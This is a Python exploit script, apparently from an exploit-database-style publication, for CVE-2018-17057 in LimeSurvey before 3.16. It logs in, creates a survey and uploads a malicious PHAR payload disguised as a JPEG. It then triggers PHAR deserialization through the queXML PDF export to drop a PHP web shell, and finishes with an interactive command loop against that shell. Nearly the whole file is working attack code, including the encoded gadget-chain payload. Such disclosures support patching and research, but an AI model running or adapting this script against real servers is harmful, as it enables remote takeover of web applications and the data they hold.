#!/usr/bin/python

# Description: LimeSurvey < 3.16 use a old version of "TCPDF" library, this version is vulnerable to a Serialization Attack via the "phar://" wrapper.
# Date: 29/03/2019
# Exploit Title: Remote Code Execution in LimeSurvey < 3.16 via Serialization Attack in TCPDF.
# Exploit Author: @q3rv0
# Google Dork:
# Version: < 3.16
# Tested on: LimeSurvey 3.15
# PoC: https://www.secsignal.org/news/remote-code-execution-in-limesurvey-3-16-via-serialization-attack-in-tcpdf
# CVE: CVE-2018-17057
# SecSignal is: <3
# Usage: python exploit.py [URL] [USERNAME] [PASSWORD]

import requests
import sys
import re

SESSION = requests.Session()

# Malicious PHAR generated with PHPGGC.
# ./phpggc Yii/RCE1 system "echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php" -p phar -o /tmp/exploit.jpg

PHAR    = ("\x3c\x3f\x70\x68\x70\x20\x5f\x5f\x48\x41\x4c\x54\x5f\x43\x4f\x4d\x50\x49\x4c\x45\x52\x28\x29\x3b\x20\x3f\x3e\x0d\x0a\x38"
           "\x02\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00\x02\x02\x00\x00\x4f\x3a\x31\x31\x3a\x22\x43\x44\x62"
           "\x43\x72\x69\x74\x65\x72\x69\x61\x22\x3a\x31\x3a\x7b\x73\x3a\x36\x3a\x22\x70\x61\x72\x61\x6d\x73\x22\x3b\x4f\x3a\x31\x32"
           "\x3a\x22\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f\x72\x22\x3a\x33\x3a\x7b\x73\x3a\x31\x36\x3a\x22\x00\x43\x4d\x61\x70"
           "\x49\x74\x65\x72\x61\x74\x6f\x72\x00\x5f\x64\x22\x3b\x4f\x3a\x31\x30\x3a\x22\x43\x46\x69\x6c\x65\x43\x61\x63\x68\x65\x22"
           "\x3a\x37\x3a\x7b\x73\x3a\x39\x3a\x22\x6b\x65\x79\x50\x72\x65\x66\x69\x78\x22\x3b\x73\x3a\x30\x3a\x22\x22\x3b\x73\x3a\x37"
           "\x3a\x22\x68\x61\x73\x68\x4b\x65\x79\x22\x3b\x62\x3a\x30\x3b\x73\x3a\x31\x30\x3a\x22\x73\x65\x72\x69\x61\x6c\x69\x7a\x65"
           "\x72\x22\x3b\x61\x3a\x31\x3a\x7b\x69\x3a\x31\x3b\x73\x3a\x36\x3a\x22\x73\x79\x73\x74\x65\x6d\x22\x3b\x7d\x73\x3a\x39\x3a"
           "\x22\x63\x61\x63\x68\x65\x50\x61\x74\x68\x22\x3b\x73\x3a\x31\x30\x3a\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x22\x3b"
           "\x73\x3a\x31\x34\x3a\x22\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x4c\x65\x76\x65\x6c\x22\x3b\x69\x3a\x30\x3b\x73\x3a\x31\x31"
           "\x3a\x22\x65\x6d\x62\x65\x64\x45\x78\x70\x69\x72\x79\x22\x3b\x62\x3a\x31\x3b\x73\x3a\x31\x35\x3a\x22\x63\x61\x63\x68\x65"
           "\x46\x69\x6c\x65\x53\x75\x66\x66\x69\x78\x22\x3b\x73\x3a\x31\x34\x30\x3a\x22\x3b\x62\x61\x73\x65\x36\x34\x2c\x4f\x54\x6b"
           "\x35\x4f\x54\x6b\x35\x4f\x54\x6b\x35\x4f\x57\x56\x6a\x61\x47\x38\x67\x4d\x32\x4d\x7a\x5a\x6a\x63\x77\x4e\x6a\x67\x33\x4d"
           "\x44\x49\x77\x4e\x7a\x4d\x33\x4f\x54\x63\x7a\x4e\x7a\x51\x32\x4e\x54\x5a\x6b\x4d\x6a\x67\x79\x4e\x44\x56\x6d\x4e\x44\x63"
           "\x30\x4e\x54\x55\x30\x4e\x57\x49\x79\x4d\x6a\x59\x7a\x4d\x6a\x49\x31\x5a\x44\x49\x35\x4d\x32\x49\x79\x4d\x44\x4e\x6d\x4d"
           "\x32\x55\x77\x59\x53\x42\x38\x49\x48\x68\x34\x5a\x43\x41\x74\x63\x69\x41\x74\x63\x43\x41\x2b\x49\x48\x4e\x6f\x5a\x57\x78"
           "\x73\x4c\x6e\x42\x6f\x63\x41\x3d\x3d\x22\x3b\x7d\x73\x3a\x31\x39\x3a\x22\x00\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f"
           "\x72\x00\x5f\x6b\x65\x79\x73\x22\x3b\x61\x3a\x31\x3a\x7b\x69\x3a\x30\x3b\x69\x3a\x30\x3b\x7d\x73\x3a\x31\x38\x3a\x22\x00"
           "\x43\x4d\x61\x70\x49\x74\x65\x72\x61\x74\x6f\x72\x00\x5f\x6b\x65\x79\x22\x3b\x69\x3a\x30\x3b\x7d\x7d\x08\x00\x00\x00\x74"
           "\x65\x73\x74\x2e\x74\x78\x74\x04\x00\x00\x00\x36\xad\x9d\x5c\x04\x00\x00\x00\x0c\x7e\x7f\xd8\xb6\x01\x00\x00\x00\x00\x00"
           "\x00\x74\x65\x73\x74\xcc\xd9\x99\xbd\x5e\x65\x4e\x03\x9b\x90\xdd\xd5\x8b\xff\x28\xd2\x37\x8b\x23\xe5\x02\x00\x00\x00\x47"
           "\x42\x4d\x42")

def usage():
    if len(sys.argv) != 4:
        print "Usage: python exploit.py [URL] [USERNAME] [PASSWORD]"
        sys.exit(0)

def get(url):
	r = SESSION.get(url, verify=False)
	return r.text

def post(url, data={}, files=None, headers=None):
	r = SESSION.post(url, data=data, headers=headers, files=files, verify=False)
	return r.text

def getYIICSRFToken(url):
	res = get(url)
	token = re.findall(r'value="(.*)" name="YII_CSRF_TOKEN"', res)
	return token[0]

def getKCSRFToken(url):
	res = get(url)
	token = re.findall(r'csrftoken = "(.*)";', res)
	return token[0]

def login(url, username, password):
	token = getYIICSRFToken(url)
	data = {"YII_CSRF_TOKEN" : token,
	        "authMethod"     : "Authdb",
	        "user"           : username,
	        "password"       : password,
	        "loginlang"      : "default",
	        "action"         : "login",
	        "width"          : "1366",
	        "login_submit"   : "login"
	       }
	res = post(url, data)
	if len(re.findall("loginform", res)) == 0:
		return True
	else:
	    return False

def emailTemplates(url):
    return get(url)

def createSurvey(url_newsurvey, url_insert):
	token = getYIICSRFToken(url_newsurvey)
	data = {"YII_CSRF_TOKEN" : token,
	        "surveyls_title" : "Survey Example - SecSignal",
	        "language"       : "en",
	        "createsample"   : "0",
	        "description"    : "foo",
	        "url"            : "",
	        "urldescrip"     : "",
	        "dateformat"     : "1",
	        "numberformat_en": "0",
	        "welcome"        : "bar",
	        "endtext"        : "asdf",
	        "owner_id"       : "1",
	        "admin"          : "Administrator",
	        "adminemail"     : "test%40gsecsignal.org",
	        "bounce_email"   : "test%40gsecsignal.org",
	        "faxto"          : "",
	        "gsid"           : "1",
	        "format"         : "G",
	        "template"       : "fruity",
	        "navigationdelay": "0",
	        "questionindex"  : "0",
	        "showgroupinfo"  : "B",
	        "showqnumcode"   : "X",
	        "shownoanswer"   : "Y",
	        "showxquestions" : "0",
	        "showxquestions" : "1",
	        "showwelcome"    : "0",
	        "showwelcome"    : "1",
	        "allowprev"      : "0",
	        "nokeyboard"     : "0",
	        "showprogress"   : "0",
	        "showprogress"   : "1",
	        "printanswers"   : "0",
	        "publicstatistics" : "0",
	        "publicgraphs"   : "0",
	        "autoredirect"   : "0",
	        "startdate"      : "",
	        "expires"        : "",
	        "listpublic"     : "0",
	        "usecookie"      : "0",
	        "usecaptcha_surveyaccess" : "0",
	        "usecaptcha_registration" : "0",
	        "usecaptcha_saveandload"  : "0",
	        "datestamp"               : "0",
	        "ipaddr"                  : "0",
	        "refurl"                  : "0",
	        "savetimings"             : "0",
	        "assessments"             : "0",
	        "allowsave"               : "0",
	        "allowsave"               : "1",
	        "emailnotificationto"     : "",
	        "emailresponseto"         : "",
	        "googleanalyticsapikeysetting" : "N",
	        "googleanalyticsstyle"         : "0",
	        "tokenlength"                  : "15",
	        "anonymized"                   : "0",
	        "tokenanswerspersistence"      : "0",
	        "alloweditaftercompletion"     : "0",
	        "allowregister"                : "0",
	        "htmlemail"                    : "0",
	        "htmlemail"                    : "1",
	        "sendconfirmation"             : "0",
	        "sendconfirmation"             : "1",
	        "saveandclose"                 : "1"
	       }
	res = post(url_insert, data)
	surveyid = re.findall(r'surveyid\\/([0-9]+)', res)
	return surveyid[0] # Return SurveyiD

def uploadPHAR(url_upload, url_csrf_token, phar):
	kcfinder_csrftoken = getKCSRFToken(url_csrf_token)
	files = {'upload[]': ('malicious.jpg', phar)}
	data  = {"dir"                : "files",
	         "kcfinder_csrftoken" : kcfinder_csrftoken
	        }
	res = post(url_upload, data, files)
	return res

def pdfExport(url_pdf_export, surveyid):
	token = getYIICSRFToken(url_pdf_export + surveyid)
	data = {"save_language" : "en",
	        "queXMLStyle"   : '<h1>Stage 2</h1><img src="phar://./upload/surveys/'+ surveyid + '/files/malicious.jpg">',
	        "queXMLSingleResponseAreaHeight" : "9",
	        "queXMLSingleResponseHorizontalHeight" : "10.5",
	        "queXMLQuestionnaireInfoMargin" : "5",
	        "queXMLResponseTextFontSize" : "10",
	        "queXMLResponseLabelFontSize" : "7.5",
	        "queXMLResponseLabelFontSizeSmall" : "6.5",
	        "queXMLSectionHeight" : "18",
	        "queXMLBackgroundColourSection" : "221",
	        "queXMLBackgroundColourQuestion" : "241",
	        "queXMLAllowSplittingSingleChoiceHorizontal" : "0",
	        "queXMLAllowSplittingSingleChoiceHorizontal" : "1",
	        "queXMLAllowSplittingSingleChoiceVertical" : "0",
	        "queXMLAllowSplittingSingleChoiceVertical" : "1",
	        "queXMLAllowSplittingMatrixText" : "0",
	        "queXMLAllowSplittingMatrixText" : "1",
	        "queXMLAllowSplittingVas" : "0",
	        "queXMLPageOrientation" : "P",
	        "queXMLPageFormat" : "A4",
	        "queXMLEdgeDetectionFormat" : "lines",
	        "YII_CSRF_TOKEN" : token,
	        "ok" : "Y"}
	res = post(url_pdf_export + surveyid, data)
	return res

def shell(url):
    r = requests.get("%s/shell.php" % url)
    if r.status_code == 200:
       print "[+] Pwned! :)"
       print "[+] Getting the shell..."
       while 1:
           try:
               input = raw_input("$ ")
               r = requests.get("%s/shell.php?c=%s" % (url, input))
               print r.text
           except KeyboardInterrupt:
               sys.exit("\nBye kaker!")
    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    url      = sys.argv[1] # URL
    username = sys.argv[2] # Username
    password = sys.argv[3] # Password
    url_login = "%s/index.php/admin/authentication/sa/login" % url

    print "[*] Logging in to LimeSurvey..."
    if login(url_login, username, password):

        url_newsurvey = "%s/index.php/admin/survey/sa/newsurvey" % url
        url_insert = "%s/index.php/admin/survey/sa/insert" % url

        print "[*] Creating a new Survey..."
        surveyid = createSurvey(url_newsurvey, url_insert)
        print "[+] SurveyID: %s" % surveyid

        email_templates = "%s/index.php/admin/emailtemplates/sa/index/surveyid/%s" % (url, surveyid)

        emailTemplates(email_templates)

        url_csrf_token = "%s/third_party/kcfinder/browse.php?opener=custom&type=files&CKEditor=email_invitation_en&langCode=en" % url
        url_upload     = "%s/third_party/kcfinder/browse.php?type=files&lng=en&opener=custom&act=upload" % url

        print "[*] Uploading a malicious PHAR..."
        uploadPHAR(url_upload, url_csrf_token, PHAR)

        url_pdf_export = "%s/index.php/admin/export/sa/quexml/surveyid/" % url

        print "[*] Sending the Payload..."
        export_response = pdfExport(url_pdf_export, surveyid)
        print "[*] TCPDF Response: %s" % export_response

        shell(url)
    else:
        print "[-] Bad credentials :("

if __name__ == "__main__":
    main()